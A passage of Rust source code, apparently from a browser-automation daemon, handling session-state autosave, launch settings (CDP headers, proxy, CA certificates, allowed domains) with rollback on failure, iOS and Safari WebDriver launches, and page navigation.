        return;
    }

    state.restore_status = "loaded".to_string();
    state.restore_status_detail = None;
    state.restore_loaded_path = Some(path.to_string());
    state.restore_load_failed = false;
    state.restore_validation_pending = false;
    state.restore_save_status = "not_attempted".to_string();
    state.restore_saved_path = None;
}

/// Quiet time required after the last command before a periodic autosave may
/// run, so a multi-second save never stalls an active command burst.
const AUTOSAVE_QUIET_PERIOD_MS: u64 = 2_000;

/// Whether the daemon's periodic tick should attempt an autosave right now.
///
/// Timing and dialog pre-checks only; restore-key, save-policy, and browser
/// gating live in `maybe_autosave_restore_state` and `auto_save_restore_state`.
fn autosave_due(state: &DaemonState, interval_ms: u64) -> bool {
    if interval_ms == 0 {
        return false;
    }
    // A JS dialog blocks the renderer's main thread, so the storage-collection
    // evaluate would hang until its CDP timeout. Wait for the dialog instead.
    if state.pending_dialog.is_some() {
        return false;
    }
    let now = std::time::Instant::now();
    if let Some(t) = state.last_command_finished {
        if now.duration_since(t) < std::time::Duration::from_millis(AUTOSAVE_QUIET_PERIOD_MS) {
            return false;
        }
    }
    if let Some(t) = state.last_autosave_attempt {
        if now.duration_since(t) < std::time::Duration::from_millis(interval_ms) {
            return false;
        }
    }
    true
}

/// Periodically persist session state while a browser is open with a restore
/// key configured, so a browser the user closes by hand (which kills CDP and
/// makes save-on-close impossible) loses at most roughly `interval_ms` of
/// state. Saves stay eligible even without new commands: the page itself can
/// mutate cookies and storage while idle (token refreshes, background
/// requests), so idle sessions are re-saved on every interval too.
///
/// Called from the daemon's background tick. Failures are expected while a
/// page is mid-navigation; the next interval retries, and
/// `auto_save_restore_state` records the status either way.
pub(crate) async fn maybe_autosave_restore_state(state: &mut DaemonState, interval_ms: u64) {
    if !autosave_due(state, interval_ms) {
        return;
    }
    // Sessions without a restore key, or with saving disabled, never autosave.
    if state.session_name.is_none() || state.restore_save == "never" {
        return;
    }
    // No browser means nothing to collect from.
    if state.browser.is_none() {
        return;
    }
    state.last_autosave_attempt = Some(std::time::Instant::now());
    let _ = auto_save_restore_state(state).await;
}

pub(crate) async fn auto_save_restore_state(
    state: &mut DaemonState,
) -> Result<Option<String>, String> {
    validate_restore_if_pending(state).await;

    let Some(session_name) = state.session_name.clone() else {
        state.restore_save_status = "not_configured".to_string();
        state.restore_saved_path = None;
        return Ok(None);
    };

    match state.restore_save.as_str() {
        "never" => {
            state.restore_save_status = "disabled".to_string();
            state.restore_saved_path = None;
            return Ok(None);
        }
        "auto" if state.restore_load_failed => {
            state.restore_save_status = "skipped_restore_failed".to_string();
            state.restore_saved_path = None;
            return Ok(None);
        }
        "auto" | "always" => {}
        other => {
            state.restore_save_status = "invalid_policy".to_string();
            state.restore_saved_path = None;
            return Err(format!(
                "Invalid restore save policy '{}'. Use auto, always, or never.",
                other
            ));
        }
    }

    let Some(ref mgr) = state.browser else {
        state.restore_save_status = "no_browser".to_string();
        state.restore_saved_path = None;
        return Ok(None);
    };
    let active_session_id = mgr.active_session_id()?.to_string();

    match state::save_auto_state_transactional(
        &mgr.client,
        &active_session_id,
        &session_name,
        &state.session_id,
        mgr.visited_origins(),
    )
    .await
    {
        Ok(path) => {
            state.restore_save_status = "saved".to_string();
            state.restore_saved_path = Some(path.clone());
            // Saves from any path (close, relaunch, restore-key change) reset
            // the periodic interval so the tick doesn't immediately re-save.
            state.last_autosave_attempt = Some(std::time::Instant::now());
            Ok(Some(path))
        }
        Err(err) => {
            state.restore_save_status = "error".to_string();
            state.restore_saved_path = None;
            Err(err)
        }
    }
}

/// Load storage state if a path is configured.
///
/// Explicit launch should surface this error. Best-effort callers can ignore
/// the returned `Result` and keep their previous behavior.
async fn load_storage_state(state: &mut DaemonState, path: &Option<String>) -> Result<(), String> {
    if let Some(ref path) = path {
        ensure_state_replay_supported_by_active_domain_filter(state, "--state/storageState")
            .await?;
        let mut skipped = None;
        if let Some(ref mgr) = state.browser {
            if let Ok(session_id) = mgr.active_session_id() {
                skipped = Some(state::load_state(&mgr.client, session_id, path).await?);
            }
        }
        if let Some(skipped) = skipped {
            mark_explicit_storage_state_loaded(state, path);
            state.restore_skipped_origins.extend(skipped);
        }
    }

    Ok(())
}

async fn rollback_failed_launch(state: &mut DaemonState) -> Result<(), String> {
    let close_result = close_current_browser(state).await;
    state.ref_map.invalidate_all_documents();
    close_result
}

async fn load_storage_state_or_rollback(
    state: &mut DaemonState,
    path: &Option<String>,
) -> Result<(), String> {
    if let Err(err) = load_storage_state(state, path).await {
        if let Err(close_err) = rollback_failed_launch(state).await {
            return Err(format!(
                "{} (also failed to roll back browser after launch: {})",
                err, close_err
            ));
        }
        return Err(err);
    }

    Ok(())
}

/// Loads the storage state a launch was set up with. A command that named the
/// state file fails the launch when it cannot be loaded; a launch that only
/// inherits it continues without the state.
async fn load_storage_state_for_launch(
    state: &mut DaemonState,
    path: &Option<String>,
    strict: bool,
) -> Result<(), String> {
    if strict {
        load_storage_state_or_rollback(state, path).await
    } else {
        let _ = load_storage_state(state, path).await;
        Ok(())
    }
}

// ---------------------------------------------------------------------------
// Phase 1 handlers
// ---------------------------------------------------------------------------

/// Optional WebSocket connect headers for generic CDP URLs (`cdpUrl` / `--cdp`).
/// Headers from the last explicit CDP launch, when it named this endpoint.
fn cdp_headers_for(state: &DaemonState, endpoint: &str) -> Option<Vec<(String, String)>> {
    state
        .cdp_headers
        .as_ref()
        .filter(|(saved, _)| saved == endpoint)
        .map(|(_, headers)| headers.clone())
}

/// Headers the session was configured with alongside its CDP target.
fn cdp_headers_from_settings(settings: &Running) -> Option<Vec<(String, String)>> {
    let raw = settings.cdp_headers()?;
    let headers: Value = serde_json::from_str(&raw).ok()?;
    cdp_headers_from_command(&json!({ "cdpHeaders": headers }))
}

/// A relaunch rewritten to the attached CDP target keeps that target's headers.
fn attach_saved_cdp_headers(launch: &mut Value, state: &DaemonState) {
    let endpoint = match (launch.get("cdpUrl"), launch.get("cdpPort")) {
        (Some(Value::String(url)), _) => url.clone(),
        (_, Some(port)) => port.to_string(),
        _ => return,
    };
    if let Some(headers) = cdp_headers_for(state, &endpoint) {
        let map: serde_json::Map<String, Value> = headers
            .into_iter()
            .map(|(name, value)| (name, Value::String(value)))
            .collect();
        launch["cdpHeaders"] = Value::Object(map);
    }
}

/// Distinct from page/origin `--headers` (Fetch interception).
fn cdp_headers_from_command(cmd: &Value) -> Option<Vec<(String, String)>> {
    let map = cmd.get("cdpHeaders")?.as_object()?;
    if map.is_empty() {
        return None;
    }
    let headers: Vec<(String, String)> = map
        .iter()
        .filter_map(|(k, v)| v.as_str().map(|s| (k.clone(), s.to_string())))
        .collect();
    if headers.is_empty() {
        None
    } else {
        Some(headers)
    }
}

async fn handle_launch(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    handle_launch_with_deadline(cmd, state, BROWSER_USE_SETUP_DEADLINE).await
}

async fn handle_launch_with_deadline(
    cmd: &Value,
    state: &mut DaemonState,
    deadline: std::time::Duration,
) -> Result<Value, String> {
    let mut resolved = resolve_launch_target(cmd, state.attached_target.as_ref());
    if let Some(launch) = resolved.as_mut() {
        attach_saved_cdp_headers(launch, state);
    }
    let cmd = resolved.as_ref().unwrap_or(cmd);
    let result = handle_launch_for_target(cmd, state, deadline).await;
    if result.is_ok() {
        state.attached_target = AttachedTarget::from_launch_command(cmd);
        Box::pin(start_flow_capture(state)).await?;
    }
    result
}

/// Starts flow capture on a freshly launched browser when the session's
/// `capture` setting asks for it. A session that already captures keeps its
/// steps.
async fn start_flow_capture(state: &mut DaemonState) -> Result<(), String> {
    if !state.settings.captures_flow() || state.flow.active() {
        return Ok(());
    }
    Box::pin(handle_har_start(&json!({}), state)).await?;
    let page_url = match state.browser.as_ref() {
        Some(mgr) => mgr.get_url().await.ok(),
        None => None,
    };
    state.flow.begin_capture(page_url);
    Ok(())
}

/// Rejects capture modes the daemon cannot record, before they are stored.
fn check_capture_setting(patch: &Patch) -> Result<(), String> {
    match patch.value(Key::Capture) {
        Some(Value::Array(modes)) => {
            let modes: Vec<String> = modes
                .iter()
                .filter_map(|m| m.as_str().map(String::from))
                .collect();
            super::flow::parse_capture(&modes)
        }
        _ => Ok(()),
    }
}

async fn handle_launch_for_target(
    cmd: &Value,
    state: &mut DaemonState,
    deadline: std::time::Duration,
) -> Result<Value, String> {
    if cmd.get("cdpUrl").and_then(Value::as_str).is_some()
        || cmd.get("cdpPort").and_then(Value::as_u64).is_some()
        || cmd.get("autoConnect").and_then(Value::as_bool) == Some(true)
        || !cmd
            .get("provider")
            .and_then(Value::as_str)
            .is_some_and(provider_is_browser_use)
    {
        return handle_launch_inner(cmd, state).await;
    }
    let filter = state.domain_filter.read().await.clone();
    let credentials = state.proxy_credentials.read().await.clone();
    let scripts = state.plugin_init_scripts.clone();
    let setup = state.session_setup.clone();
    let result = match tokio::time::timeout(deadline, handle_launch_inner(cmd, state)).await {
        Ok(result) => result,
        Err(_) => Err(browser_use_setup_timeout(state).await),
    };
    if result.is_err() {
        restore_domain_filter(state, &filter).await;
        *state.proxy_credentials.write().await = credentials;
        state.plugin_init_scripts = scripts;
        state.session_setup = setup;
    }
    result
}

/// The settings a `launch` command names, as a patch. A client that speaks
/// the launch protocol directly (rather than through the CLI) sets session
/// settings this way; the CLI sends the same settings as a patch on every
/// command.
fn launch_envelope_patch(cmd: &Value, engine: Option<&str>) -> Patch {
    let mut entries: Vec<(Key, Requested)> = Vec::new();
    let mut set = |key: Key, value: Value| entries.push((key, Requested::Set(value)));
    let string = |field: &str| cmd.get(field).and_then(Value::as_str).map(Value::from);
    let flag = |field: &str| cmd.get(field).and_then(Value::as_bool).map(Value::Bool);
    let list = |field: &str| string_array_from_command(cmd, field).map(Value::from);

    match AttachedTarget::named_by(cmd) {
        Some(AttachedTarget::CdpUrl(url)) => set(Key::Cdp, Value::from(url)),
        Some(AttachedTarget::CdpPort(port)) => set(Key::Cdp, Value::from(port.to_string())),
        Some(AttachedTarget::AutoConnect) => set(Key::AutoConnect, Value::Bool(true)),
        Some(AttachedTarget::Provider(provider)) => set(Key::Provider, Value::from(provider)),
        None => {}
    }
    if let Some(headers) = cmd.get("cdpHeaders").filter(|h| h.is_object()) {
        set(Key::CdpHeaders, Value::from(headers.to_string()));
    }
    if let Some(headless) = cmd.get("headless").and_then(Value::as_bool) {
        set(Key::Headed, Value::Bool(!headless));
    }
    for (field, key) in [
        ("profile", Key::Profile),
        ("storageState", Key::StorageState),
        ("executablePath", Key::ExecutablePath),
        ("userAgent", Key::UserAgent),
        ("colorScheme", Key::ColorScheme),
        ("downloadPath", Key::DownloadPath),
        ("engine", Key::Engine),
        ("caCert", Key::CaCert),
    ] {
        if let Some(value) = string(field) {
            set(key, value);
        }
    }
    for (field, key) in [
        ("ignoreHTTPSErrors", Key::IgnoreHttpsErrors),
        ("allowFileAccess", Key::AllowFileAccess),
        ("hideScrollbars", Key::HideScrollbars),
        ("webgpu", Key::Webgpu),
        ("webmcp", Key::Webmcp),
        ("noXvfb", Key::NoXvfb),
        ("clearCaCert", Key::ClearCaCert),
    ] {
        if let Some(value) = flag(field) {
            set(key, value);
        }
    }
    for (field, key) in [
        ("args", Key::Args),
        ("extensions", Key::Extensions),
        ("initScripts", Key::InitScripts),
        ("enable", Key::Enable),
        ("capture", Key::Capture),
    ] {
        if let Some(value) = list(field) {
            set(key, value);
        }
    }
    if let Some(proxy) = cmd.get("proxy") {
        let (server, username, password, bypass) = match proxy {
            Value::String(raw) => {
                let parsed = crate::session_settings::parse_proxy(raw);
                (Some(parsed.server), parsed.username, parsed.password, None)
            }
            other => {
                let field = |name: &str| other.get(name).and_then(Value::as_str).map(String::from);
                (
                    field("server"),
                    field("username"),
                    field("password"),
                    field("bypass"),
                )
            }
        };
        for (key, value) in [
            (Key::Proxy, server),
            (Key::ProxyUsername, username),
            (Key::ProxyPassword, password),
            (Key::ProxyBypass, bypass),
        ] {
            if let Some(value) = value {
                set(key, Value::from(value));
            }
        }
    }
    drop(set);
    // Obscura takes its proxy bypass from every launch, so an explicit null
    // clears it.
    if engine == Some("obscura") {
        match cmd.get("proxyBypass") {
            Some(Value::String(bypass)) => {
                entries.retain(|(key, _)| *key != Key::ProxyBypass);
                entries.push((
                    Key::ProxyBypass,
                    Requested::Set(Value::from(bypass.as_str())),
                ));
            }
            Some(Value::Null) => {
                entries.retain(|(key, _)| *key != Key::ProxyBypass);
                entries.push((Key::ProxyBypass, Requested::Default));
            }
            _ => {}
        }
    }
    if let Some(domains) = allowed_domains_from_launch_command(cmd) {
        entries.push((
            Key::AllowedDomains,
            if domains.is_empty() {
                Requested::Default
            } else {
                Requested::Set(Value::from(domains))
            },
        ));
    }
    Patch::from_entries(entries)
}

/// What applying a settings patch did to the session.
#[derive(Default)]
struct SettingsOutcome {
    /// Each change, as reported in `lifecycle.settings.changes`.
    changes: Vec<Value>,
    /// The patch asked for a relaunch whether or not anything changed.
    forced: bool,
    /// A running browser was closed so the next launch uses the new settings.
    relaunched_browser: bool,
    /// What to put back if the launch that follows fails.
    pending: Option<PendingSettings>,
}

/// The launch settings in force before a patch, kept until the launch that
/// uses the new ones succeeds.
struct PendingSettings {
    keys: Vec<Key>,
    before: Running,
    filter: Option<DomainFilter>,
    ca_cert: Option<EffectiveCaCert>,
    attached: Option<AttachedTarget>,
    cdp_headers: Option<(String, Vec<(String, String)>)>,
}

impl SettingsOutcome {
    /// Takes the launch half of a patch that was planned before the live half
    /// was applied. The launch changes were reported as pending; they are
    /// replaced by what the launch actually did.
    fn absorb(&mut self, launch: SettingsOutcome) {
        self.changes.retain(|change| change["effect"] == "live");
        self.changes.extend(launch.changes);
        self.forced = launch.forced;
        self.relaunched_browser = launch.relaunched_browser;
        self.pending = launch.pending;
    }

    /// Called when the launch failed and the launch settings were put back.
    fn mark_rolled_back(&mut self, keys: &[Key]) {
        self.relaunched_browser = false;
        let names: Vec<&str> = keys.iter().map(|key| spec(*key).name).collect();
        for change in &mut self.changes {
            if change["effect"] == "relaunch"
                && change["option"]
                    .as_str()
                    .is_some_and(|o| names.contains(&o))
            {
                change["applied"] = json!(false);
            }
        }
    }
}

/// True for the errors that reject a launch because `--allowed-domains` cannot
/// be enforced for it (a profile, a provider, an attach, a replayed state).
fn is_containment_rejection(error: &str) -> bool {
    error.contains("--allowed-domains is not supported")
}

/// Puts back the launch settings a failed launch tried to use, so later
/// commands launch with what worked before. Live settings stay applied.
///
/// A launch that fails after the filter was installed (the browser would not
/// start) never widens containment: the allowed domains the command asked for
/// stay installed. A launch rejected because the allowed domains cannot be
/// enforced for it is rejected whole, so they are put back too.
///
/// Returns why the stored security settings could not be put back, if so.
async fn rollback_launch_settings(
    state: &mut DaemonState,
    outcome: &mut SettingsOutcome,
    error: &str,
) -> Option<String> {
    let pending = outcome.pending.take()?;
    let rejected = is_containment_rejection(error);
    let restored: Vec<Key> = pending
        .keys
        .iter()
        .copied()
        .filter(|key| rejected || spec(*key).persist != Persist::Secured)
        .collect();
    for key in &restored {
        state
            .settings
            .put_back(*key, pending.before.get(*key).cloned());
    }
    if rejected {
        *state.domain_filter.write().await = pending.filter;
    }
    state.effective_ca_cert = pending.ca_cert;
    state.attached_target = pending.attached;
    state.cdp_headers = pending.cdp_headers;
    outcome.mark_rolled_back(&restored);
    if rejected {
        return state
            .store
            .save(&state.settings.security())
            .err()
            .map(|e| format!("the stored security settings could not be restored: {}", e));
    }
    None
}

/// The launch error with the rollback problem, if any, appended.
fn with_rollback_error(error: &str, rollback: Option<String>) -> String {
    match rollback {
        Some(why) => format!("{} ({})", error, why),
        None => error.to_string(),
    }
}

/// CA trust is compared by content, not by path: the same certificates from
/// another path change nothing, and an edited file at the same path is a
/// change.
fn adjust_ca_patch(state: &mut DaemonState, patch: &mut Patch) -> Result<(), String> {
    let Some(path) = patch
        .value(Key::CaCert)
        .and_then(Value::as_str)
        .map(String::from)
    else {
        return Ok(());
    };
    let requested = resolve_effective_ca_cert(&json!({ "caCert": path }), state)?;
    let digest = |ca: &Option<EffectiveCaCert>| ca.as_ref().map(|ca| *ca.bundle.digest());
    let running_path = state.settings.get(Key::CaCert).and_then(Value::as_str);
    match ca_trust_change(
        running_path,
        digest(&state.effective_ca_cert),
        &path,
        digest(&requested),
    ) {
        CaTrustChange::Unchanged => {
            patch.remove(Key::CaCert);
            state.settings.set(Key::CaCert, Value::from(path));
        }
        CaTrustChange::EditedInPlace => patch.mark_changed_in_place(Key::CaCert),
        CaTrustChange::Replaced => {}
    }
    Ok(())
}

/// Plans `patch` against the session's settings and applies the plan. Live
/// settings change in place. Launch settings close the running browser so the
/// launch that follows uses them, and they are committed for good only once
/// that launch succeeds (`rollback_launch_settings` puts them back).
///
/// A command that never launches a browser (`launches` is false) applies only
/// the live settings. Its launch changes are reported as not applied and stay
/// pending until a command that launches carries them again.
async fn apply_settings_patch(
    state: &mut DaemonState,
    patch: &Patch,
    launches: bool,
) -> Result<SettingsOutcome, String> {
    let mut patch = patch.clone();
    if launches {
        adjust_ca_patch(state, &mut patch)?;
    }

    let full = state.settings.plan(&patch);
    if full.is_empty() && full.ignored.is_empty() {
        return Ok(SettingsOutcome::default());
    }
    let ignored: Vec<Value> = full.ignored.iter().map(|c| c.to_ignored_json()).collect();
    let (plan, deferred) = if launches {
        (full, Vec::new())
    } else {
        let deferred: Vec<Value> = full
            .changes
            .iter()
            .filter(|change| change.effect() == Effect::Launch)
            .map(|change| change.to_json(false))
            .collect();
        (
            state.settings.plan(&patch.without_launch_settings()),
            deferred,
        )
    };
    let changed = |key: Key| plan.changes.iter().any(|change| change.key == key);

    // Load the CA trust first: a bad bundle fails before anything changes.
    let ca_cert = if changed(Key::CaCert) || changed(Key::ClearCaCert) {
        let request = match plan.next.get(Key::CaCert).and_then(Value::as_str) {
            Some(path) => json!({ "caCert": path }),
            None => json!({ "clearCaCert": true }),
        };
        Some(resolve_effective_ca_cert(&request, state)?)
    } else {
        None
    };

    // Security settings are stored before they are applied, so a failed write
    // leaves the session as it was and a stored setting never lags the running one.
    let next_security = plan.next.security();
    if next_security != state.settings.security() {
        state
            .store
            .save(&next_security)
            .map_err(|e| e.to_string())?;
    }

    let had_browser = has_active_browser_session(state);
    let relaunched_browser = plan.relaunch && had_browser;
    let mut changes: Vec<Value> = plan
        .changes
        .iter()
        .map(|change| {
            let applied = match change.effect() {
                Effect::Live => true,
                // The domain filter is installed at once, browser or not.
                Effect::Launch => had_browser || change.key == Key::AllowedDomains,
            };
            change.to_json(applied)
        })
        .collect();
    changes.extend(deferred);
    changes.extend(ignored);
    let connection_changed = [Key::Cdp, Key::AutoConnect, Key::Provider, Key::CdpHeaders]
        .into_iter()
        .any(changed);
    let touched: Vec<Key> = plan.changes.iter().map(|change| change.key).collect();
    let was = |key: Key| touched.contains(&key);

    let pending = if plan.relaunch {
        let mut keys: Vec<Key> = plan
            .changes
            .iter()
            .filter(|change| change.effect() == Effect::Launch)
            .map(|change| change.key)
            .collect();
        if keys.contains(&Key::ClearCaCert) {
            keys.push(Key::CaCert);
        }
        // Values dropped because the session went external come back with it.
        keys.extend(plan.ignored.iter().map(|change| change.key));
        Some(PendingSettings {
            keys,
            before: state.settings.clone(),
            filter: state.domain_filter.read().await.clone(),
            ca_cert: state.effective_ca_cert.clone(),
            attached: state.attached_target.clone(),
            cdp_headers: state.cdp_headers.clone(),
        })
    } else {
        None
    };
    let (next, relaunch) = (plan.next, plan.relaunch);

    if was(Key::DefaultTimeout) {
        state.default_timeout_ms = next.default_timeout_ms();
        // Later commands that omit the flag size their wait from the stored
        // config, so keep it in step.
        crate::connection::record_daemon_default_timeout(
            &state.session_id,
            next.get(Key::DefaultTimeout).and_then(Value::as_u64),
        );
    }
    if was(Key::IdleTimeout) {
        state.idle_activity.set_timeout(next.idle_timeout());
        state.idle_activity.mark();
    }
    if was(Key::NoAutoDialog) {
        state.auto_dialog = !next.no_auto_dialog();
    }
    if was(Key::ActionPolicy) || was(Key::ConfirmActions) || was(Key::AllowedDomains) {
        // An approval asked for under the old rules no longer stands.
        state.pending_confirmation = None;
    }
    if was(Key::ActionPolicy) {
        state.policy = next
            .security()
            .action_policy_path
            .as_deref()
            .map(ActionPolicy::from_path);
    }
    if was(Key::ConfirmActions) {
        state.confirm_actions = next
            .security()
            .confirm_actions
            .as_deref()
            .and_then(ConfirmActions::parse);
    }
    if was(Key::AllowedDomains) {
        *state.domain_filter.write().await = next
            .security()
            .allowed_domains
            .filter(|domains| !domains.is_empty())
            .map(|domains| DomainFilter::new(&domains.join(",")));
    }
    if let Some(ca_cert) = ca_cert {
        state.effective_ca_cert = ca_cert;
    }
    if was(Key::Cdp) || was(Key::CdpHeaders) {
        // The requested headers win over any cached for the endpoint, and
        // clearing them sends none.
        state.cdp_headers = match (
            next.get(Key::Cdp).and_then(Value::as_str),
            cdp_headers_from_settings(&next),
        ) {
            (Some(endpoint), Some(headers)) => Some((endpoint.to_string(), headers)),
            _ => None,
        };
    }
    if connection_changed {
        state.attached_target = None;
    }
    state.settings = next;

    if relaunch && had_browser {
        let _ = auto_save_restore_state(state).await;
        close_all_browser_backends(state).await?;
        state.ref_map.invalidate_all_documents();
    }

    Ok(SettingsOutcome {
        changes,
        forced: launches && patch.forces_relaunch(),
        relaunched_browser,
        pending,
    })
}

/// How a requested CA file compares to the trust in effect.
#[derive(Debug, PartialEq)]
enum CaTrustChange {
    /// The same certificates, whichever path they come from.
    Unchanged,
    /// The same path, different certificates.
    EditedInPlace,
    Replaced,
}

fn ca_trust_change(
    running_path: Option<&str>,
    running_digest: Option<[u8; 32]>,
    requested_path: &str,
    requested_digest: Option<[u8; 32]>,
) -> CaTrustChange {
    let same_content = running_digest.is_some() && running_digest == requested_digest;
    let same_path = running_path == Some(requested_path);
    match (same_content, same_path) {
        (true, _) => CaTrustChange::Unchanged,
        (false, true) => CaTrustChange::EditedInPlace,
        (false, false) => CaTrustChange::Replaced,
    }
}

/// Reports what a settings patch did in `lifecycle.settings`. A failed
/// response carries it too, so the caller can see what was applied before the
/// failure.
fn attach_settings_outcome(resp: &mut Value, outcome: &SettingsOutcome) {
    if outcome.changes.is_empty() && !outcome.forced {
        return;
    }
    let report = json!({ "changes": outcome.changes, "forcedRelaunch": outcome.forced });
    if resp.get("success").and_then(Value::as_bool) == Some(false) {
        let data = resp
            .as_object_mut()
            .map(|obj| obj.entry("data").or_insert_with(|| json!({})));
        if let Some(data) = data.and_then(Value::as_object_mut) {
            let lifecycle = data.entry("lifecycle").or_insert_with(|| json!({}));
            if let Some(lifecycle) = lifecycle.as_object_mut() {
                lifecycle.insert("settings".to_string(), report);
            }
        }
        return;
    }
    let Some(data) = resp.get_mut("data").and_then(Value::as_object_mut) else {
        return;
    };
    if let Some(lifecycle) = data
        .entry("lifecycle")
        .or_insert_with(|| json!({}))
        .as_object_mut()
    {
        lifecycle.insert("settings".to_string(), report);
    }
}

async fn handle_launch_inner(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let engine = cmd
        .get("engine")
        .and_then(Value::as_str)
        .map(String::from)
        .or_else(|| state.settings.engine());
    let patch = launch_envelope_patch(cmd, engine.as_deref());
    check_capture_setting(&patch)?;
    let had_browser_before_launch = has_active_browser_session(state);

    let mut outcome = apply_settings_patch(state, &patch, true).await?;
    let reusable = !outcome.relaunched_browser
        && match (state.browser.as_mut(), state.webdriver_backend.as_ref()) {
            (Some(mgr), _) => !mgr.has_process_exited() && mgr.is_connection_alive().await,
            (None, Some(webdriver)) => webdriver.is_connection_alive().await,
            (None, None) => false,
        };
    if reusable {
        return Ok(json!({ "launched": true, "reused": true, "relaunchedBrowser": false }));
    }

    // The command's own settings can name the file too (bare `open`).
    let strict_state = patch.value(Key::StorageState).is_some()
        || Patch::from_wire(cmd.get("settings"))
            .is_ok_and(|settings| settings.value(Key::StorageState).is_some());
    match auto_launch_with(state, plugins_from_command_or_env(cmd), cmd, strict_state).await {
        Ok(extras) => {
            let mut result = json!({
                "launched": true,
                "relaunchedBrowser": had_browser_before_launch,
            });
            if let (Some(result), Some(extras)) = (result.as_object_mut(), extras.as_object()) {
                result.extend(extras.clone());
            }
            Ok(result)
        }
        Err(e) => {
            let rollback = rollback_launch_settings(state, &mut outcome, &e).await;
            Err(with_rollback_error(&e, rollback))
        }
    }
}

async fn launch_ios(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let device_name = cmd.get("deviceName").and_then(|v| v.as_str());
    let device_udid = cmd.get("udid").and_then(|v| v.as_str());
    let platform_version = cmd.get("platformVersion").and_then(|v| v.as_str());

    // Select device (or use default)
    let device = ios::select_device(device_name, device_udid)?;

    // Boot simulator if it's not real and not already booted
    if !device.is_real && device.state != "Booted" {
        ios::boot_simulator(&device.udid)?;
    }

    // Start Appium
    let mut appium = AppiumManager::connect_or_launch(Some(&device.udid)).await?;

    // Create iOS Safari session
    appium
        .create_ios_session(Some(&device.name), platform_version)
        .await?;

    // Create a WebDriverBackend from the Appium session for common commands
    if let Some(sid) = appium.client.session_id_pub().map(String::from) {
        let wd_client = super::webdriver::client::WebDriverClient::new_with_session(4723, sid);
        state.webdriver_backend = Some(WebDriverBackend::new(wd_client));
    }

    state.appium = Some(appium);
    state.backend_type = BackendType::WebDriver;
    state.engine = "safari".to_string();
    write_engine_file(&state.session_id, &state.engine);
    write_provider_file(&state.session_id, "ios");
    write_extensions_file(&state.session_id, &state.settings);
    state.reset_input_state();

    Ok(json!({
        "launched": true,
        "provider": "ios",
        "device": device.name,
        "udid": device.udid,
        "backend": "webdriver",
    }))
}

async fn launch_safari(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let port: u16 = cmd
        .get("port")
        .and_then(|v| v.as_u64())
        .map(|p| p as u16)
        .unwrap_or(0);
    let driver_port = if port > 0 { port } else { 0 };

    // Find a free port if none specified
    let actual_port = if driver_port > 0 {
        driver_port
    } else {
        // Use any available high port
        let listener = std::net::TcpListener::bind("127.0.0.1:0")
            .map_err(|e| format!("Failed to find free port: {}", e))?;
        listener
            .local_addr()
            .map_err(|e| format!("Failed to get local address: {}", e))?
            .port()
    };

    let driver = safari::launch_safaridriver(actual_port)?;
    let mut client = super::webdriver::client::WebDriverClient::new(actual_port);

    client
        .create_session(serde_json::json!({
            "browserName": "safari",
        }))
        .await?;

    state.safari_driver = Some(driver);
    state.webdriver_backend = Some(WebDriverBackend::new(client));
    state.backend_type = BackendType::WebDriver;
    state.engine = "safari".to_string();
    write_engine_file(&state.session_id, &state.engine);
    write_provider_file(&state.session_id, "safari");
    write_extensions_file(&state.session_id, &state.settings);
    state.reset_input_state();

    Ok(json!({
        "launched": true,
        "provider": "safari",
        "port": actual_port,
        "backend": "webdriver",
    }))
}

async fn handle_navigate(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let url = cmd
        .get("url")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'url' parameter")?;

    {
        let df = state.domain_filter.read().await;
        if let Some(ref filter) = *df {
            filter.check_url(url)?;
        }
    }

    // WebDriver backend path
    if let Some(ref wb) = state.webdriver_backend {
        if state.browser.is_none() {
            state.webmcp.clear_invocations();
            state.ref_map.invalidate_all_documents();
            wb.navigate(url).await?;
            let new_url = wb.get_url().await.unwrap_or_else(|_| url.to_string());
            let title = wb.get_title().await.unwrap_or_default();
            return Ok(json!({ "url": new_url, "title": title }));
        }
    }

    let mgr = state.browser.as_mut().ok_or("Browser not launched")?;

    let wait_until = cmd
        .get("waitUntil")
        .and_then(|v| v.as_str())
        .map(WaitUntil::from_str)
        .unwrap_or(WaitUntil::Load);

    // If --headers was passed, store them keyed by origin and enable Fetch
    // interception. The background fetch_handler_task (started on launch)
    // injects them into matching requests in real-time.
    let scoped_headers = cmd
        .get("headers")
        .and_then(|v| v.as_object())
        .filter(|m| !m.is_empty());

    if let Some(headers_map) = scoped_headers {
        if let Some(origin) = url::Url::parse(url)
            .ok()
            .map(|u| u.origin().ascii_serialization())
        {
            let headers: HashMap<String, String> = headers_map
                .iter()
                .filter_map(|(k, v)| v.as_str().map(|s| (k.clone(), s.to_string())))
                .collect();

            let first_origin_header = {
                let mut map = state.origin_headers.write().await;
                let first = map.is_empty();
                map.insert(origin, headers);
                first
            };

            // Enable Fetch interception the first time --headers is used.
            // Fetch.enable is idempotent — safe even if domain filter or
            // routes already enabled it. Wildcard ensures we see all requests.
            if first_origin_header {
                let session_id = mgr.active_session_id()?.to_string();
                let has_proxy_creds = state.proxy_credentials.read().await.is_some();
                let mut params = json!({ "patterns": [{ "urlPattern": "*" }] });
                if has_proxy_creds {
                    params["handleAuthRequests"] = json!(true);
                }
                mgr.client
                    .send_command("Fetch.enable", Some(params), Some(&session_id))
                    .await?;
            }
        }
    }

    navigate_active_page(state, url, wait_until).await
}

/// Navigate the active page and drop element refs and frame scope. Every
/// command that replaces the active document must go through here, or a
/// stale `@e3` from the previous page keeps resolving. WebMCP page state is
/// invalidated by `Page.frameNavigated` only when the document is replaced.
async fn navigate_active_page(
    state: &mut DaemonState,
    url: &str,
    wait_until: WaitUntil,
) -> Result<Value, String> {
    // Same-document navigation retains registered tools and pending calls.
    // Subscribe before navigating, then let the ordered frameNavigated and
    // toolsAdded events invalidate and repopulate state for a new document.
    let page_session = state
        .browser
        .as_ref()
        .and_then(|browser| browser.active_session_id().ok())
        .map(ToString::to_string);
    let _ = enable_webmcp_events(state).await;

    // With one tab, every tracked iframe belongs to the page being replaced.
    // With multiple tabs, retain the other tabs' sessions so switching back to
    // an already-attached OOPIF does not lose its execution context.
    let has_background_tabs = state
        .browser
        .as_ref()
        .is_some_and(|browser| browser.page_count() > 1);
    if !has_background_tabs {
        state.iframe_sessions.clear();
    }

    if let Some(session_id) = page_session.as_deref() {
        state.ref_map.invalidate_page(session_id);
    } else {
        state.ref_map.begin_snapshot();
    }
